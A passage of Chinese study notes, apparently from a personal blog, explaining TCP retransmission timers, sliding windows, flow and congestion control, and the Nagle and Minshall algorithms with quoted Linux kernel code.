需要 TCP 通过采样 RTT 的时间，进行加权平均，算出一个平滑的 RTT 值，这个值会根据网络变化而不断变化；除了采样 RTT ，还要采样 RTT 的波动范围，这样避免如果 RTT 又一个大的波动的话，而导致很难被发现的情况。
</p>

<p>
<a href="https://datatracker.ietf.org/doc/html/rfc6298">RFC6298</a> 建议计算 RTO 的公式：
</p>
<ol class="org-ol">
<li>首次计算 RTO , R1 为第一次测量的 RTT
\[\text{SRTT} = R_{1}\]
\[\text{DevRTT} = \frac{R_{1}}{2}\]
\[\text{RTO} = \mu \text{SRTT} + \theta \text{DevRTT} = \mu R_{1} + \theta \frac{R_{1}}{2}\]</li>
<li>后续计算 RTO ，R2 为最新测量的 RTT
\[\text{SRTT} = \text{SRTT} + \alpha (\text{RTT} - \text{SRTT}) = R_{1} + \alpha (R_{2} - R_{1})\]
\[\text{DevRTT} = (1 - \beta) \text{DevRTT} + \beta (\vert \text{RTT} - \text{SRTT} \vert) = (1 - \beta)\frac{R_{1}}{2} + \beta(\vert R_{2} - R_{1} \vert)\]
\[\text{RTO} = \mu \text{SRTT} + \theta \text{DevRTT}\]</li>
</ol>

<p>
Linux 系统中：
   \[\alpha = 0.125, \beta=0.25, \mu = 1, \theta = 4\]
</p>
</div>

<div id="outline-container-orged5642e" class="outline-3">
<h3 id="orged5642e">超时重传</h3>
<div class="outline-text-3" id="text-orged5642e">
<p>
超时重传：发送数据时，设置一个定时器，当超出指定的时间后，没有收到对方的 ACK 确认应答报文，就会重发该数据。
即在 <b>数据包丢失</b> 和 <b>确认应答丢失</b> 这两种情况下发生超时重传。超时重传时间 (RTO, Retransmission Timeout) 一般设置是略大于报文往返 RTT 值。
如果超时重发的数据，再次超时的时候而又需要重传的时候， TCP 的策略是超时间隔加倍。
</p>
</div>
</div>

<div id="outline-container-org9cc8f89" class="outline-3">
<h3 id="org9cc8f89">快速重传</h3>
<div class="outline-text-3" id="text-org9cc8f89">
<p>
Fast Retransmit: 不以时间为驱动，而以数据驱动重传。
即在某个 TCP 报文丢失时，在超时定时器过期前，连续发送 3 个 ACK 报文，表示有报文丢失，需要重传。
</p>
</div>
</div>

<div id="outline-container-org080a796" class="outline-3">
<h3 id="org080a796">SACK(Selective Acknowledgment)</h3>
<div class="outline-text-3" id="text-org080a796">
<p>
在 TCP 头部选项字段里加一个 SACK ，可以将已缓存的数据告诉发送方，这样发送方就知道哪些数据收到了，哪些没收到，于是发送方就可以只重传丢失的数据。
</p>
<blockquote>
<p>
Linux:
net.ipv4.tcp_sack
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org99ba65f" class="outline-3">
<h3 id="org99ba65f">D-SACK(Duplicate SACK)</h3>
<div class="outline-text-3" id="text-org99ba65f">
<p>
使用 SACK 告诉发送方有哪些数据被重复接收了。在 ACK 丢包和因为网络延时而导致重传报文比原报文先到的时候可以告诉发送方哪些数据被重复接收了。
</p>
</div>
</div>

<div id="outline-container-org24c8fdb" class="outline-3">
<h3 id="org24c8fdb">滑动窗口</h3>
<div class="outline-text-3" id="text-org24c8fdb">
<p>
在一定的窗口大小内，无需等待确认应答，而可以继续发送数据的最大值。窗口的实现实际上是操作系统开辟的一个缓存空间，发送方主机在等到确认应答返回之前，必须在缓冲区中保留已发送的数据，如果按期收到确认应答，此时数据就可以从缓冲区清除。
</p>

<p>
只要收到接收方的 ACK 应答，可以认为在此确认序列号之前的报文已被接收方成功接收。
</p>

<p>
窗口的协商通过 TCP 头部的 Window 字段实现。Window 字段为接收端告诉发送端自己还有多少缓冲区可以接收数据。于是发送端就可以根据这个接收端的处理能力来发送数据，而不会导致接受端处理不过来。
通常窗口的大小由 <b>接收方</b> 的窗口大小决定。
</p>

<p>
发送方的滑动窗口：
</p>
<ul class="org-ul">
<li>已发送并收到 ACK 确认的数据（不计入窗口，将被清除）</li>
<li>已发送但未收到 ACK 确认的数据（可用窗口）</li>
<li>未发送但总大小在接收方处理范围内（实际可用窗口）</li>
<li>未发送但总大小超过接收方处理范围（不计入窗口）</li>
</ul>
<p>
利用一个变量和三个指针变量：
</p>
<ul class="org-ul">
<li><code>SND.WND</code>: 表示发送窗口的大小（由接收方决定）</li>
<li><code>SND.UNA</code>: 绝对指针，指向已发送但未收到确认的第一个字节的序列号</li>
<li><code>SND.NXT</code>: 绝对指针，指向未发送但可发送范围的第一个字节的序列号</li>
<li><code>SND.WND-(SND.NXT-SND.UNA)</code>: 相对指针，指向未发送但总大小超过接收方处理范围的第一个字节的序列号</li>
</ul>

<p>
接收方的滑动窗口：
</p>
<ul class="org-ul">
<li>已成功接收并确认的数据（等待应用进程读取，应用程序读取后，窗口可以变大一些）</li>
<li>未收到数据但可以接收的数据</li>
<li>未收到数据不可以接收的数据</li>
</ul>
<p>
利用一个变量和两个指针变量：
</p>
<ul class="org-ul">
<li><code>RCV.WND</code>: 表示接收窗口的大小</li>
<li><code>RCV.NXT</code>: 绝对指针，指向未收到但可以接收的数据的第一个字节的序列号</li>
<li><code>RCV.NXT+RCV.WND</code>: 相对指针，指向未收到不可以接收的数据的第一个字节的序列号</li>
</ul>

<p>
发送方的滑动窗口约等于接收方的。
</p>

<blockquote>
<p>
Window size scaling factor? 如果没有窗口因子，那窗口默认最大 64KB ，不能满足如今的需要，在 TCP option 字段中定义窗口扩大因子，用于扩大 TCP 通告窗口，其值大小是 2^{14} ，这样 TCP 最大窗口大小从 16 位扩展到 30 位，最大窗口值 1GB 。
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org05791e5" class="outline-3">
<h3 id="org05791e5">流量控制</h3>
<div class="outline-text-3" id="text-org05791e5">
<p>
滑动窗口本质上是操作系统的缓冲区，会被操作系统调整。
例如说上层应用没有及时从缓冲区读取数据，会造成接收窗口减少并通知发送方。这种情况下可能导致窗口会收缩为 0 ，即窗口关闭，发送方会定时发送窗口探测报文，以便知道接受方的窗口是否发生了改变。
</p>

<p>
在操作系统资源紧张时，操作系统会直接减少接收缓冲区的大小，这时上层应用又无法及时读取缓存数据，会出现数据包丢失的情况。此时若发送方还按照之前的窗口发送数据，超出缓冲区大小的数据会被丢弃，发送方的可用窗口可能会变成负值。
为了应对这种情况， TCP 规定不允许同时减少缓冲区又收缩窗口，而要采用先收缩窗口，过段时间再减少缓冲区大小。
</p>

<p>
窗口关闭：接收方在发送窗口为 0 的报文一段时间后，又可以接收数据了，但发送的窗口改变的 ACK 报文丢失了，可能造成死锁，即发送方一直等待接收方的非 0 窗口通知，接收放因为不知道发送的报文丢失的情况而一直等待发送方的数据。
为此， TCP 为每次连接设有一个持续定时器，只要 TCP 连接一方收到对方的零窗口通知，就启动持续计时器，如果持续计时器超时，就会发送窗口探测报文，而接受方在确认这个探测报文时，给出自己现在的接收窗口大小。
</p>

<p>
糊涂窗口综合症（Silly Window Syndrome）：如果接收方太忙了，来不及取走接收窗口里的数据，那么就会导致发送方的发送窗口越来越小，到最后，如果接受方腾出几个字节并告诉发送方现在有几个字节的窗口，而发送方又立即按窗口大小发送这几个字节（数据甚至比首部还少）。
接收方在窗口大小小于 min(MSS, buffer/2) 时直接向发送方通告窗口为 0，阻止对方再发送数据过来。
发送方使用 Nagle 算法：
</p>
<ol class="org-ol">
<li>等到 <b>窗口</b> 大于或者 <b>数据</b> 大于 MSS</li>
<li>收到之前发送数据的 ACK 回应</li>
</ol>
<p>
满足任意一条就可以发送数据。
可以设置 Socket <a href="20220718-socket.html#ID-8f561f8b-dcb8-412d-89fe-bb5d51641fc9">TCP_NODELAY</a> 关闭此算法。
</p>
</div>
</div>

<div id="outline-container-orgc5c5a37" class="outline-3">
<h3 id="orgc5c5a37">拥塞控制</h3>
<div class="outline-text-3" id="text-orgc5c5a37">
<p>
在网络出现拥堵时，如果继续发送⼤量数据包，可能会导致数据包时延、丢失等，这时 TCP 就会重传数据，但是⼀重传就会导致⽹络的负担更重，于是会导致更⼤的延迟以及更多的丢包，这个情况就会进⼊恶性循环被不断地放⼤。
</p>

<p>
拥塞窗口 <code>cwnd</code> 是发送方维护的一个状态变量，根据网络拥塞程度动态变化。 1 个 <code>cwnd</code> 表示一个 MSS 大小。
发送窗口 <code>swnd = min(cwnd, rwnd)</code>
只要网络中没有出现拥塞（没有超时重传）， <code>cwnd</code> 就会增大，反之则减少。
</p>

<p>
四个控制算法：
</p>
<ul class="org-ul">
<li>慢启动</li>
<li>拥塞避免</li>
<li>拥塞发生</li>
<li>快速恢复</li>
</ul>
</div>

<div id="outline-container-org66d6337" class="outline-4">
<h4 id="org66d6337">慢启动</h4>
<div class="outline-text-4" id="text-org66d6337">
<p>
TCP 连接在刚建立完成后，首先进入慢启动阶段，一点一点提高发送数据包的数量：当发送方每收到一个 ACK ，拥塞窗口 <code>cwnd</code> 就加 1 。拥塞窗口呈指数增长。
慢启动阈值 <code>ssthresh(slow start threshold)</code> ，小于此值使用慢启动算法，大于等于此值使用拥塞避免算法。
</p>
</div>
</div>

<div id="outline-container-orgc77d2a6" class="outline-4">
<h4 id="orgc77d2a6">拥塞避免</h4>
<div class="outline-text-4" id="text-orgc77d2a6">
<p>
一般 <code>ssthresh</code> 的大小是 65535 字节，进入拥塞避免阶段，每当收到一个 ACK 时， <code>cwnd</code> 增加 <code>1/cwnd</code> ，也就是要收到 <code>cwnd</code> 个 ACK ，能才增加 1 <code>cwnd/MSS</code> 。此时拥塞窗口呈线性增长。
</p>
</div>
</div>

<div id="outline-container-orgd20c0df" class="outline-4">
<h4 id="orgd20c0df">拥塞发生</h4>
<div class="outline-text-4" id="text-orgd20c0df">
<p>
重传机制：超时重传和快速重传。
超时重传时：
</p>
<pre class="example">
ssthresh = cwnd / 2
cwnd = 1
</pre>
<p>
相当于此时 TCP 重新进入慢启动阶段，数据流剧烈减少。
</p>

<p>
快速重传时：
</p>
<pre class="example">
cwnd = cwnd / 2
ssthresh = cwnd
</pre>
<p>
进入快速恢复过程。快速重传就是接收方连续发送 3 个 ACK ，发送方接收到后开始重传，因为接受到了 3 个 ACK ，所以接收方可以认为此时的网络不是特别槽糕， <code>cwnd</code> 窗口减半。
</p>
</div>
</div>

<div id="outline-container-orgadd5744" class="outline-4">
<h4 id="orgadd5744">快速恢复</h4>
<div class="outline-text-4" id="text-orgadd5744">
<p>
在快速重传已经改变 <code>cwnd</code> 和 <code>ssthresh</code> 的基础上：
</p>
<ol class="org-ol">
<li><code>cwnd = ssthresh + 3</code> 因为收到了 3 个 ACK 包</li>
<li>重传丢失的数据包</li>
<li>再收到重复的 ACK ，那么 <code>cwnd</code> 加 1</li>
<li>如果收到新数据的 ACK ，把 <code>cwnd</code> 设置为第一步中的 <code>ssthresh</code> 的值
因为该 ACK 确认了新的数据，说明从 Duplicate ACK 时的数据都已收到，该恢复过程已经结束，可以回到恢复之前的状态了，即再次进入拥塞避免阶段</li>
</ol>

<blockquote>
<p>
收到 3 个重复的 ACK 意味着网络很有可能没有阻塞。比如有报文段 1, 2, 3, 4 重复收到报文段 1 的序号，那么意味着实际上 2, 3, 4 都是到达了对方，如果此时只将 cwnd 减半，那么很有可能未确认的报文数量是要大于或接近 cwnd 的，此时数据几乎不发送，而当新的 ACK 达到时，滑动窗口右滑，又可能造成大量的数据同时发送出去。既然有 3 个重复的 ACK ，那么至少有 3 个包是离开了网络的，我们就可以透支给 cwnd+3 ，以后每当收到一个重复的 ACK ，就意味着一个包离开网络，我们就可以给 cwnd+1 。而当新的 ACK 到达时，如果不把 cwnd 还原，很有可能会发送大量的数据出去，所以最好的办法是将透支的大小都给还回来。
</p>
</blockquote>
</div>
</div>
</div>
</div>
<div id="outline-container-org13b7504" class="outline-2">
<h2 id="org13b7504">TCP 的一些算法</h2>
<div class="outline-text-2" id="text-org13b7504">
</div>
<div id="outline-container-org39d5146" class="outline-3">
<h3 id="org39d5146">Nagle</h3>
<div class="outline-text-3" id="text-org39d5146">
<p>
小包：包长度小于 MSS 的包；
大包：包长度等于 MSS 的包。
发送方会先将第一个小包发送出去，而将后面到达的少量数据都缓存起来而不立即发送，直到收到对端对前一个数据包报文段的 ACK 确认，或当前数据属于紧急数据，或积攒到了一定量（大于等于 MSS）等情况才将数据发送出去。
Linux Kernel 3.4.4:
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #8D8D84; font-style: italic;">// Filename : \linux-3.4.4\net\ipv4\tcp_output.c:1384</span>
<span style="color: #8D8D84; font-style: italic;">/* Return 0, if packet can be sent now without violation Nagle's rules:</span>
<span style="color: #8D8D84; font-style: italic;"> * 1. It is full sized.</span>
<span style="color: #8D8D84; font-style: italic;"> * 2. Or it contains FIN. (already checked by caller)</span>
<span style="color: #8D8D84; font-style: italic;"> * 3. Or TCP_CORK is not set, and TCP_NODELAY is set.</span>
<span style="color: #8D8D84; font-style: italic;"> * 4. Or TCP_CORK is not set, and all sent packets are ACKed.</span>
<span style="color: #8D8D84; font-style: italic;"> *    With Minshall's modification: all sent small packets are ACKed.</span>
<span style="color: #8D8D84; font-style: italic;"> */</span>
<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_nagle_check</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
                  <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">skb</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
                  <span style="color: #006FE0;">unsigned</span> <span style="color: #BA36A5;">mss_now</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #006FE0;">int</span> <span style="color: #BA36A5;">nonagle</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
<span style="color: #707183; background-color: #FFFFFF;">{</span>
    <span style="color: #0000FF;">return</span> skb<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">len</span> <span style="color: #0000FF;">&lt;</span> mss_now <span style="color: #0000FF;">&amp;&amp;</span> <span style="color: #8D8D84; font-style: italic;">// &#25968;&#25454;&#38271;&#24230;&#19981;&#22815;</span>
        <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #909183; background-color: #FFFFFF;">(</span>nonagle <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCP_NAGLE_CORK</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span> <span style="color: #8D8D84; font-style: italic;">// &#26410;&#24320;&#21551; nagle &#26102;&#20869;&#26680;&#21152;&#22622;(cork)&#20102;</span>
         <span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">!</span>nonagle <span style="color: #0000FF;">&amp;&amp;</span> tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">packets_out</span> <span style="color: #0000FF;">&amp;&amp;</span> <span style="color: #006DAF;">tcp_minshall_check</span><span style="color: #709870; background-color: #FFFFFF;">(</span>tp<span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
         <span style="color: #8D8D84; font-style: italic;">// &#24320;&#21551;&#20102; nagle &#19988;&#27809;&#26377;&#26410;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
         <span style="color: #8D8D84; font-style: italic;">// &#36820;&#22238; 1 &#34920;&#31034;&#19981;&#31435;&#21363;&#21457;&#36865;&#65292;&#24773;&#20917;&#26159;</span>
         <span style="color: #8D8D84; font-style: italic;">// 1. &#38271;&#24230;&#19981;&#22815; &#19988; &#21152;&#22622;</span>
         <span style="color: #8D8D84; font-style: italic;">// 2. &#38271;&#24230;&#19981;&#22815; &#19988; &#24320;&#21551;&#20102; nagle &#19988; &#26377;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
         <span style="color: #8D8D84; font-style: italic;">// tp-&gt;packets_out &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#21253;</span>
         <span style="color: #8D8D84; font-style: italic;">// tcp_minshall_check &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;&#65288;&#25913;&#36827;&#65289;</span>
         <span style="color: #8D8D84; font-style: italic;">// tcp_minshall_check: \linux-3.4.4\net\ipv4\tcp_output.c:1378</span>
<span style="color: #707183; background-color: #FFFFFF;">}</span>

<span style="color: #8D8D84; font-style: italic;">/* Return non-zero if the Nagle test allows this packet to be</span>
<span style="color: #8D8D84; font-style: italic;"> * sent now.</span>
<span style="color: #8D8D84; font-style: italic;"> */</span>
<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_nagle_test</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">skb</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
                 <span style="color: #006FE0;">unsigned int</span> <span style="color: #BA36A5;">cur_mss</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #006FE0;">int</span> <span style="color: #BA36A5;">nonagle</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
<span style="color: #707183; background-color: #FFFFFF;">{</span>
    <span style="color: #8D8D84; font-style: italic;">/* Nagle rule does not apply to frames, which sit in the middle of the</span>
<span style="color: #8D8D84; font-style: italic;">     * write_queue (they have no chances to get new data).</span>
<span style="color: #8D8D84; font-style: italic;">     *</span>
<span style="color: #8D8D84; font-style: italic;">     * This is implemented in the callers, where they modify the 'nonagle'</span>
<span style="color: #8D8D84; font-style: italic;">     * argument based upon the location of SKB in the send queue.</span>
<span style="color: #8D8D84; font-style: italic;">     */</span>
    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span>nonagle <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCP_NAGLE_PUSH</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>

    <span style="color: #8D8D84; font-style: italic;">/* Don't use the nagle rule for urgent data (or for the final FIN).</span>
<span style="color: #8D8D84; font-style: italic;">     * Nagle can be ignored during F-RTO too (see RFC4138).</span>
<span style="color: #8D8D84; font-style: italic;">     */</span>
    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #006DAF;">tcp_urg_mode</span><span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span> <span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">frto_counter</span> <span style="color: #0000FF;">==</span> <span style="color: #D0372D;">2</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span>
        <span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #006DAF;">TCP_SKB_CB</span><span style="color: #709870; background-color: #FFFFFF;">(</span>skb<span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">tcp_flags</span> <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCPHDR_FIN</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>

    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">!</span><span style="color: #006DAF;">tcp_nagle_check</span><span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #333333; background-color: #FFFFFF;">,</span> skb<span style="color: #333333; background-color: #FFFFFF;">,</span> cur_mss<span style="color: #333333; background-color: #FFFFFF;">,</span> nonagle<span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>

    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
<span style="color: #707183; background-color: #FFFFFF;">}</span>
</pre>
</div>

<p>
传统 Nagle 算法可视为一种包-停-等协议，它在未收到前一个包的确认前不会发送第二个包，除非迫不得已。而改进的 Nagle 算法是一种折中处理，如果未确认的不是小包，那么第二个包可以发送出去，能保证在同一个 RTT 内，网络上只有一个当前连接的小包，因为如果前一个小包未被确认，不会发出第二个小包。
但是，改进的 Nagle 算法在某些情况下反而会出现不利，例如：
MSS 为 1000 时，到达 1000, 600, 600 三个数据块，后续暂时没有其他数据块；
传统 Nagle 算法是 1000, 1000, 200 这样发送，只产生 1 个小包；
而改进的 Nagle 算法是 1000, 600, 600 这样发送，会产生 2 个小包。
</p>

<p>
一般 TCP 发包的流程：
</p>
<pre class="example">
tcp_push() -&gt; __tcp_push_pending_frames() -&gt; tcp_write_xmit()
</pre>

<p>
而如果所有发出去的数据包都已经确认并且有数据包等待发送，会导致调用 <code>tcp_check_probe_timer()</code> ：
</p>
<pre class="example">
tcp_probe_timer() -&gt; tcp_send_probe0() -&gt; tcp_write_wakeup() -&gt; tcp_transmit_skb()
</pre>
<p>
从而绕过 Nagle 和 <code>TCP_CORK</code> ，既然反正是要发一个数据包（零窗口探测包），如果有实际数据等待发送，那么干脆就直接发送一个负载等待发送数据的数据包岂不是更好。
</p>
</div>

<div id="outline-container-orgd22da6c" class="outline-4">
<h4 id="orgd22da6c">改进的 Nagle - Minshall</h4>
<div class="outline-text-4" id="text-orgd22da6c">
<p>
确保在一个 RTT 内只有一个当前连接的小包，可以在一定程度上的缓解因为 Nagle 和 DelayAck 同时开启时奇数小包阻塞的问题。
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_minshall_check</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
<span style="color: #707183; background-color: #FFFFFF;">{</span>
    <span style="color: #6434A3;">reutrn</span> <span style="color: #006699;">after</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #6434A3;">tp</span><span style="color: #0000FF;">-&gt;</span><span style="color: #BA36A5;">snd_sml</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #6434A3;">tp</span><span style="color: #0000FF;">-&gt;</span><span style="color: #BA36A5;">snd_una</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">&amp;&amp;</span>
        <span style="color: #0000FF;">!</span><span style="color: #006DAF;">after</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span>tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">snd_sml</span><span style="color: #333333; background-color: #FFFFFF;">,</span> tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">snd_nxt</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
<span style="color: #707183; background-color: #FFFFFF;">}</span>
</pre>
</div>


<figure id="org75eddf9">
<img src="../images/tcp_nagle_minshall.png" alt="tcp_nagle_minshall.png">

</figure>
</div>
</div>
</div>
<div id="outline-container-org4481dc9" class="outline-3">
<h3 id="org4481dc9">Delayed Acknowledgment</h3>
</div>
<div id="outline-container-orgeba869c" class="outline-3">
<h3 id="orgeba869c">Per-Host PASW(Protect Against Wrapped Sequences)</h3>
</div>
<div id="outline-container-org77863ab" class="outline-3">
<h3 id="org77863ab">SYN Cookies</h3>
</div>
</div>
<div id="outline-container-orgaae50a7" class="outline-2">
<h2 id="orgaae50a7">Reference</h2>
<div class="outline-text-2" id="text-orgaae50a7">
<ul class="org-ul">
<li>图解网络-小林coding-v3.0.pdf</li>
</ul>
</div>
</div>
</div>
<div id="postamble" class="status">
<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
</div>
</body>
</html>
